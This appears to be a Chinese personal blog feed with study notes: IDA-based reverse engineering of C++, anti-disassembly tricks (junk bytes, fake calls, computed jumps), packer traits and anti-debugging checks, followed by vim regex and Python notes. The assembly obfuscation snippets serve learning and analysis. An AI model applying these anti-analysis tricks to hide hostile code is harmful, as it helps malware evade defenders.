<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseCalss</span> &#123;</span></div><div class="line">    <span class="keyword">public</span>: </div><div class="line">        BaseClass();</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc1</span><span class="params">()</span> </span>= <span class="number">0</span>;</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc2</span><span class="params">()</span></span>;</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc3</span><span class="params">()</span></span>;</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc4</span><span class="params">()</span></span>;</div><div class="line">    <span class="keyword">private</span>:</div><div class="line">        <span class="keyword">int</span> x, y;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubClass</span>:</span> <span class="keyword">public</span> BaseCalss &#123;</div><div class="line">    <span class="keyword">public</span>: </div><div class="line">        SubClass();</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc1</span><span class="params">()</span></span>;</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc3</span><span class="params">()</span></span>;</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">vfunc5</span><span class="params">()</span></span>;</div><div class="line">    <span class="keyword">private</span>:</div><div class="line">        <span class="keyword">int</span> z;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>BaseClass含有 4个虚函数 + 3个数据成员(vtable pointer, x, y)<br>SubClass含有 5个虚函数 + 4个数据成员(vtable pointer, x, y, z)</p>
<p>我照着抄写的例子怎么通不过…好气啊…</p>
<p>vtable是放在rodata段的…那么就不能hack了是吗…<br>emmm,好像不需要hack这个表…我们的hack点在于把对象中指向vtable的指针的指向改变…</p>
<p>其实不太懂,我这里个g++涉及到类, 比如 new, 和对象成员函数调用都是用了fastcall</p>
<p>而且这一块的汇编..惨不忍睹…<br>我还是太菜了</p>
<ol>
<li>RTTI(Runtime Type Identification)<br>运行时类型识别</li>
</ol>
<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><p>上次做题目,patch是使劲点patch,结果发现没毛用<br>后来在IDA里记下offset, 然后用<code>GHex</code>修改的…</p>
<p>今天翻开书…看到这样子一段话</p>
<blockquote>
<p>IDA并不能帮助你轻松修改二进制文件, …, 一些顽固的用户通常会继续提出以下问题:”那么Edit &gt; Patch Program有什么用”</p>
</blockquote>
<p>哈哈哈哈, 不过, 到底是我wine的锅, 还是确实不能用这个功能<br>好像又可以了…</p>
<h2 id="IDA脚本"><a href="#IDA脚本" class="headerlink" title="IDA脚本"></a>IDA脚本</h2><ol>
<li>File &gt; Script</li>
<li>File &gt; IDC Command</li>
<li>File &gt; Python Command</li>
</ol>
<p>这一块没怎么学..略过了</p>
<h2 id="反静态分析"><a href="#反静态分析" class="headerlink" title="反静态分析"></a>反静态分析</h2><p>例子1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">start_:</div><div class="line">    xor eax, eax</div><div class="line">    test eax, eax</div><div class="line">    jz label1</div><div class="line">    jnz label1</div><div class="line">    db 0E8H ; call</div><div class="line"></div><div class="line">label1:</div><div class="line">    xor eax, 3</div><div class="line">    add eax, 4</div><div class="line">    ret</div></pre></td></tr></table></figure></p>
<p>看这里的<code>db 0E8H</code>就是junk code, 这里其实不会被执行到, 但对他编译, 再反汇编之后…会起到混淆作用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">xor eax, eax</div><div class="line">test eax, eax</div><div class="line">je xxxxxx</div><div class="line">jne xxxxxx</div><div class="line">call yyyyyyy ; 看这里这个junk code</div></pre></td></tr></table></figure></p>
<p>这个时候需要把<code>call yyyyyy</code>这里<code>Unfined</code>, 按一下<code>U</code><br>然后再在要跳转到的<code>xxxxxx</code>这个位置<code>Code</code>, 即按一下<code>C</code><br>emmmmmmmm, 这样子</p>
<p>例子2<br>反汇编代码(修复后)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">    call loc_A04B0D7</div><div class="line">    db   0C7h   ; 0x0A04B0D6</div><div class="line">loc_A04B0D7:</div><div class="line">    pop eax     ; (eax) = 0x0A04B0D6</div><div class="line">    lea eax, [eax + 0Ah]    ; (eax) = 0x0A04B0E0</div><div class="line">    db   0E8h</div><div class="line">    jmp eax</div><div class="line">start endp</div></pre></td></tr></table></figure></p>
<p>这里的call是个假的…<br>就是把返回地址ret给pop出去了, 然后若无其事的继续执行<br>后来的这个<code>jmp eax</code>里<code>eax</code>的值实际上是能确定的, 但IDA不能识别</p>
<p>这里需要修复两次一个是<code>db 0C7h</code>, 一个是<code>db 0E8h</code>…</p>
<p>先根据<code>call loc_A04B0D7</code><br>找到<code>loca_A04B0DB</code>这里重新反汇编一下<br>然后在<code>db 0E8h</code>这里原来是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">loc_A04B0DB:</div><div class="line">    jmp short near ptr loc_A04B0DB + 1  ; E8 FF</div><div class="line">start endp</div><div class="line">db 0E0h                                 ; E0</div></pre></td></tr></table></figure></p>
<p>其实应该是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">db 0E8h     ; E8</div><div class="line">jmp eax     ; FF E0</div><div class="line">start endp</div></pre></td></tr></table></figure></p>
<p>例子3 动态计算目标地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">... ;寄存器之间各种计算</div><div class="line">pop eax</div><div class="line">pop ebx</div><div class="line">... ;恢复现场</div><div class="line">xchg edi, [esp]</div><div class="line">retn</div></pre></td></tr></table></figure></p>
<p>返回地址是动态计算出来,存到了<code>edi</code>里, 之后存到了栈顶<code>[esp]</code></p>
<ol>
<li>加壳…<br>加了壳, 尤其是UPX这样子的壳, 没办法静态分析了就<br>就要先脱壳</li>
</ol>
<p>加壳后的特征:</p>
<pre><code>1. 有非标准段名称
1. 一个或者多个程序既可以写又可以执行
1. Functions, Imports, Strins 很少有内容
</code></pre><ol>
<li>一般壳用到的API (windows…)<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">HINSTANCE <span class="title">LoadLibrary</span><span class="params">(LPCTSTR lpLibFileName)</span>    <span class="comment">// 根据名称加载dll, 返回句柄</span></span></div><div class="line"><span class="function">HMODULE   <span class="title">GetModuleHandle</span><span class="params">(LPCTSTR lpModuleName)</span>  <span class="comment">// 获取dll句柄</span></span></div><div class="line"><span class="function">FARPROC   <span class="title">GetProcAddress</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">            HMODULE hModule,    <span class="comment">// DLL模块句柄</span></span></span></div><div class="line"><span class="function"><span class="params">            LPCSTR  lpProcName  <span class="comment">// 函数名</span></span></span></div><div class="line"><span class="function"><span class="params">            )</span></span></div></pre></td></tr></table></figure>
</li>
</ol>
<p>先把dll加载进来, 最后获取函数<br>一般的,可能dll早已经加载进来, 那么直接获取句柄, 然后获取函数就可以了</p>
<ol>
<li>有目的的攻击分析工具<br>woc, 这个厉害了…</li>
</ol>
<h2 id="反动态分析"><a href="#反动态分析" class="headerlink" title="反动态分析"></a>反动态分析</h2><ol>
<li>检测是在虚拟机运行还是本机运行</li>
<li>检测检查工具</li>
<li>检测调试器(反调试)</li>
</ol>
<ul>
<li>isDebuggerPresent (win)</li>
<li>ptrace (Linux)<br>这一块收藏过一篇文章, 然后再看一下</li>
</ul>
<h2 id="自己学习一丢丢C"><a href="#自己学习一丢丢C" class="headerlink" title="自己学习一丢丢C++"></a>自己学习一丢丢C++</h2><p>c++感觉会push好多东西.导致IDA里看到某些函数参数错误</p>
<p>就比如我这里的<code>cout &lt;&lt; 2 &lt;&lt; 3</code><br>转化得到的其实是<code>cout &lt;&lt; 2</code>和<code>cout &lt;&lt; 3</code><br>所以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">sub  esp, 8</div><div class="line">push 2</div><div class="line">push offset _ZSt4cout@@GLIBCXX_3_4</div><div class="line">call __ZNSolsEi</div><div class="line">add  esp, 10h</div><div class="line"></div><div class="line">sub  esp, 8</div><div class="line">push 3</div><div class="line">push offset _ZSt4cout@@GLIBCXX_3_4</div><div class="line">call __ZNSolsEi</div><div class="line">add  esp, 10h</div></pre></td></tr></table></figure></p>
<p>我其实不太明白…为什么<br>这里是两个参数,只要<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push 2</div><div class="line">push offset _ZSt4cout@@GLIBCXX_3_4</div><div class="line">call __ZNSolsEi</div><div class="line">add  esp, 8</div></pre></td></tr></table></figure></p>
<p>这样子直接<br>push 8字节参数, 调用函数, <code>add esp, 8</code>就可以了,</p>
<p>为什么要先<code>sub esp, 8</code>, 然后压参, 调用, 最后算上清理参数的8个字节, 清理的时候就是<code>add esp, 10h</code>了<br>为什么呢 ==!啊啊啊</p>
<p>这个只有输入输出其实还不太复杂<br>这个string…好复杂啊…<br>就这一小节<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="built_in">string</span> s = <span class="string">"123"</span>;</div><div class="line">    <span class="built_in">string</span> ss = <span class="string">"456"</span>;</div><div class="line">    <span class="built_in">cin</span> &gt;&gt; s;</div><div class="line">    <span class="built_in">cout</span> &lt;&lt; s;</div><div class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="number">2</span>;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>大概流程是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">..</div><div class="line">call std::allocator&lt;char&gt;::allocator(void)</div><div class="line">call 各种命名空间::basic_string()   ;初始化s</div><div class="line">call std::allocator&lt;char&gt;::~allocator(void)</div><div class="line"></div><div class="line">call std::allocator&lt;char&gt;::allocator(void)</div><div class="line">call 各种命名空间::basic_string()   ;初始化ss</div><div class="line">call std::allocator&lt;char&gt;::~allocator(void)</div><div class="line"></div><div class="line">call &gt;&gt;(offset_cin, )</div><div class="line"></div><div class="line">call &lt;&lt;(offset_cout, )</div><div class="line"></div><div class="line">call &lt;&lt;(offset_cout, 2)</div><div class="line"></div><div class="line">call 各种命名空间::~basic_string()   ;销毁s</div><div class="line">call 各种命名空间::~basic_string()   ;销毁ss</div></pre></td></tr></table></figure></p>
<h2 id="F5的问题"><a href="#F5的问题" class="headerlink" title="F5的问题"></a>F5的问题</h2><p>第一次要在那个, emmmmm, 要在<code>IDA View</code>窗口 的 图表模式按下F5, 才能起作用<br>如果已经用空格切换到文字模式, 好像按下F5没用…</p>
<h2 id="defs-h"><a href="#defs-h" class="headerlink" title="defs.h"></a>defs.h</h2><p>我们提取出来的IDA里的c代码, 如果直接编译是通不过的,因为是某些东西未定义</p>
<p>这个文件,,emmmm,很有用,在IDA的plugins目录下</p>
<blockquote>
<p>This file contains definitions used by the Hex-Rays decompiler output.</p>
</blockquote>
<p>比如我们提取出IDA里的某一块逻辑出来, 这个时候会有一些比如<code>DOWRD</code>之类类型的定义, 这些定义都在这个头文件里, </p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[todo-list]]></title>
      <url>/2017/08/12/todo-list/</url>
      <content type="html"><![CDATA[<ol>
<li>关注预报名</li>
<li>我该复习啥…</li>
<li>先复习数据结构好了</li>
<li>免杀攻防 [√]</li>
<li>xss.pdf</li>
<li>IDA pro权威指南 [√]</li>
<li>leet-code有一本…</li>
<li>vim入门</li>
</ol>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[vim入门]]></title>
      <url>/2017/08/12/vim%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>很久以前, 得到一本传说级教程,然后就看了几十页, 现在基本的可以使用,但好些时候稍有不方便,把书拿出来,看了看</p>
<h2 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h2><ol>
<li>实际行和屏幕行<br>在常用操作前加上<code>g</code>就变成了屏幕行移动, 比如<code>j</code>变成了<code>gj</code></li>
</ol>
<p>这个实际行是<code>set nu</code>出现的行号, 屏幕行的话就是如果一行比较长, 那某一行可能在屏幕上占用好几行</p>
<p><code>g0</code>和<code>g$</code>可以用在屏幕行首尾跳转, 更小的范围跳转, mark一下, 相见恨晚<br>还有<code>g^</code></p>
<ol>
<li>基于单词移动<br>下面的下一个…可能误解<br>比如<code>下一个单词开头</code>是<code>下一个 单词的开头</code><br>aaa bbb</li>
</ol>
<p><code>w</code> 下一个单词开头<br><code>e</code> 下一个单词结尾</p>
<p>下面俩是反向, 往前找<br><code>b</code> 下一个单词开头<br><code>ge</code> 下一个单词结尾…这个我好像用不了</p>
<ol>
<li>单词和字串<br>面向单词的操作是小写的 <code>w</code>, <code>b</code>, <code>e</code>, <code>ge</code><br>面向字串的操作是大写的 <code>W</code>, <code>B</code>, <code>E</code>, <code>GE</code><br>单词: 由字母, 数字, 下划线, 或者其他空白字符组成<br>这个定义怎么理解:<br> 这里的空白字符都是自成单词<br>字串: 由非空白字符序列组成, 以空白字符分割<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e.g. it&apos;s going too slow</div></pre></td></tr></table></figure>
</li>
</ol>
<p>这里的<code>e</code>,<code>.</code>,<code>g</code>,<code>.</code> 这是四个单词</p>
<ol>
<li><p>行内查找字符<br>f{char}<br>下一个  ;<br>上一个  ,</p>
</li>
<li><p>全文查找<br>用命令/<br>下一个 n<br>上一个 N<br>取消高亮 :nohl</p>
</li>
</ol>
<ol>
<li>边界<br>iw 当前单词<br>aw 当前单词及一个空格<br>iW 当前字串<br>aW 当前字串及一个空格<br>is 当前句子<br>as 当前句子及一个空格<br>ip 当前段落<br>ap 当前段落及一个空行</li>
</ol>
<h2 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">body</span> &#123; <span class="attribute">color</span>: <span class="number">#3c3c3c</span>; &#125;</div><div class="line"><span class="selector-tag">a</span> &#123; <span class="attribute">color</span>: <span class="number">#0000EE</span>; &#125;</div><div class="line"><span class="selector-tag">strong</span> &#123; <span class="attribute">color</span>: <span class="number">#000</span>; &#125;</div></pre></td></tr></table></figure>
<p>要匹配颜色值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/#\([0-9a-fA-F]\&#123;6&#125;\|[0-9a-fA-F]\&#123;3&#125;\)</div></pre></td></tr></table></figure></p>
<p>天…真的好复杂…</p>
<p>在此例中，我们用到了 3 类括号。方括号缺省具有特殊含义，因此不用转义。圆括号会按原义匹配字符(及)，因此需要转义，使其具有特殊含义。花括号也一样需要转义，不过，我们只需为开括号转义，而与之对应的闭括号则不用，因为 Vim 会推测我们的意图。圆括号的情况有所不同，无论开闭括号都必须转义</p>
<p>这里的或者<code>|</code>也转义了</p>
<p>还是不太懂为什么这里方括号不转义</p>
<p>例子摘自书… 记下记下记下</p>
<p>书里说道<code>\v</code>开启新世界大门!<br>使用了<code>\v</code> 假定除_、大小写字母以及数字 0 到 9 之外的所有字符都具有特殊含义, 所以!<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/\v#([0-9a-fA-F]&#123;6&#125;|[0-9a-fA-F]&#123;3&#125;)</div></pre></td></tr></table></figure></p>
<p>开心. 如果, 用<code>\x</code>的话就可以变成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/\v#(\x&#123;6&#125;|\x&#123;3&#125;)</div></pre></td></tr></table></figure></p>
<p>这里的<code>#</code>没有特殊含义, 所以也可以直接用</p>
<ol>
<li>圆括号捕获子匹配<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">I love Paris in the</div><div class="line">the springtime.</div></pre></td></tr></table></figure>
</li>
</ol>
<p>匹配连续出现两次的相同单词<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/\v&lt;(\w+)\_s+\1&gt;</div></pre></td></tr></table></figure></p>
<p><code>\1</code>~<code>\9</code>代表第n个子匹配, <code>\0</code>代表整个匹配<br><code>&lt;&gt;</code>匹配单词边界<br><code>\_s</code>匹配空白字符或者换行</p>
<p>另外在圆括号前加上<code>%</code>表示不捕获</p>
<ol>
<li>单词边界<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">the there three</div></pre></td></tr></table></figure>
</li>
</ol>
<p>用<code>/\vthe</code>的话…会匹配三个单词<br>如果<code>/\v&lt;the&gt;</code>就匹配<code>the</code>一个单词</p>
]]></content>
      
        
        <tags>
            
            <tag> vim </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python入门]]></title>
      <url>/2017/08/12/python%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>流畅的py-读书笔记</p>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="list-amp-tuple"><a href="#list-amp-tuple" class="headerlink" title="list &amp; tuple"></a>list &amp; tuple</h3><ol>
<li>列表推导<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">symbols = <span class="string">'ABCD'</span></div><div class="line">codes = []</div><div class="line"><span class="keyword">for</span> symbol <span class="keyword">in</span> symbols:</div><div class="line">    codes.append(ord(symbol))</div></pre></td></tr></table></figure>
</li>
</ol>
<p>等价于<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">symbols = <span class="string">'ABCD'</span></div><div class="line">codes = [ord(symbol) <span class="keyword">for</span> symbol <span class="keyword">in</span> symbols]</div></pre></td></tr></table></figure></p>
<blockquote>
<p>其实, 这里有变量泄露的问题, 这个时候symbol会泄露到全局</p>
</blockquote>
<p>也可以这样子, 习惯了js的,其实感觉更喜欢这样子写<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">symbols = <span class="string">'ABCD'</span></div><div class="line">codes = map(ord, symbols)</div></pre></td></tr></table></figure></p>
<p>其实开始没想到字符串也可以for, 阔以map</p>
<blockquote>
<p>Python 会忽略代码里 []、 {} 和 () 中的换行, 一行太长的时候可以把一行拆成多行写</p>
</blockquote>
<p>emmmmmmm~, 但是如果有条件的话,比如<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">symbols = <span class="string">'ABCD'</span></div><div class="line">codes = [ord(symbol) <span class="keyword">for</span> symbol <span class="keyword">in</span> symbols <span class="keyword">if</span> ord(symbol) &gt; <span class="number">127</span>]</div></pre></td></tr></table></figure></p>
<p>等价到<code>filter</code>和<code>map</code>后, 就要用lambda表达式,像这样子<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">symbols = <span class="string">'ABCD'</span></div><div class="line">codes = filter(<span class="keyword">lambda</span> c: c &gt; <span class="number">127</span>, map(ord, symbols)))</div></pre></td></tr></table></figure></p>
<p>列表推导还可以是二维的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>[char+num <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">'ABCD'</span> <span class="keyword">for</span> num <span class="keyword">in</span> <span class="string">'1234'</span>]</div></pre></td></tr></table></figure></p>
<ol>
<li>生成器表达式<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>codes1 = tuple([ord(symbol) <span class="keyword">for</span> symbol <span class="keyword">in</span> symbols])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>codes1 = tuple(ord(symbol) <span class="keyword">for</span> symbol <span class="keyword">in</span> symbols)</div></pre></td></tr></table></figure>
</li>
</ol>
<p>上面第一个是列表推导产生了一个列表,又拿列表初始化了一个tuple<br>而下面这个就是叫生成器表达式…因为<code>tuple()</code>这已经有了圆括号,所以这里省去了生成器表达式两边的括号</p>
<p>生成器表达式和列表推导不同的是一次产生一个元素, 表达上两边圆括号代替方括号</p>
<h3 id="tuple"><a href="#tuple" class="headerlink" title="tuple"></a>tuple</h3><p>tuple和list都能存放不同类型的元素, 除此外还有collections.deque也可以的<br>与list不同, tuple是不可变的</p>
<p>常见用法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">'[*]%d %d'</span> % (<span class="number">1</span>, <span class="number">2</span>)</div></pre></td></tr></table></figure></p>
<p>交换两数字<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a, b = b, a</div></pre></td></tr></table></figure></p>
<p>元祖拆包-元祖前加上*, 可以拆包作为函数参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>ord(*(<span class="string">'A'</span>, ))</div></pre></td></tr></table></figure></p>
<p>可以方便函数返回多个值, 然后一拆包…</p>
<ol>
<li><p>collections.namedtuple<br>带字段名的tuple…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>Person = namedtuple(<span class="string">'Person'</span>, [<span class="string">'firstName'</span>, <span class="string">'lastName'</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>haibin = Person(<span class="string">'hai'</span>, <span class="string">'bin'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>haibin.firstName</div><div class="line"><span class="string">'hai'</span></div></pre></td></tr></table></figure>
</li>
<li><p>切片<br>list, tuple, str等支持切片操作</p>
</li>
</ol>
<p>基本操作 [a:b:c], 其中c是步长,如果是负数,就是倒着来的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>haibin[::]</div><div class="line"><span class="string">'haibin'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>haibin[::<span class="number">1</span>]</div><div class="line"><span class="string">'haibin'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>haibin[::<span class="number">-1</span>]</div><div class="line"><span class="string">'nibiah'</span></div></pre></td></tr></table></figure></p>
<p>所以<code>[::-1]</code>可以实现Reverse的效果</p>
<p>注意的点是:<br>切片和区间操作不包括区间最后一个元素(即右边界), str[: 2] 是 不包括 str[2]的<br>比如<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>range(<span class="number">10</span>) == range(<span class="number">0</span>, <span class="number">10</span>)</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>range(<span class="number">10</span>)</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</div></pre></td></tr></table></figure></p>
<p>这个range不包括右边界10…</p>
<p>切片赋值<br>直接贴书上的例子<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>l = list(range(<span class="number">10</span>))</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l[<span class="number">2</span>:<span class="number">5</span>] = [<span class="number">20</span>, <span class="number">30</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> l[<span class="number">5</span>:<span class="number">7</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>]</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l[<span class="number">3</span>::<span class="number">2</span>] = [<span class="number">11</span>, <span class="number">22</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">22</span>, <span class="number">9</span>]</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l[<span class="number">2</span>:<span class="number">5</span>] = <span class="number">100</span></div><div class="line">Traceback (most recent call last):</div><div class="line">File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">TypeError: can only assign an iterable</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l[<span class="number">2</span>:<span class="number">5</span>] = [<span class="number">100</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l</div><div class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">100</span>, <span class="number">22</span>, <span class="number">9</span>]</div></pre></td></tr></table></figure></p>
<p>等号右边必须是可迭代对象,即便只有一个元素</p>
<ol>
<li><p>sort<br>list.sort 对原list排序,返回None<br>sorted 不改变原来的对象, 返回新list</p>
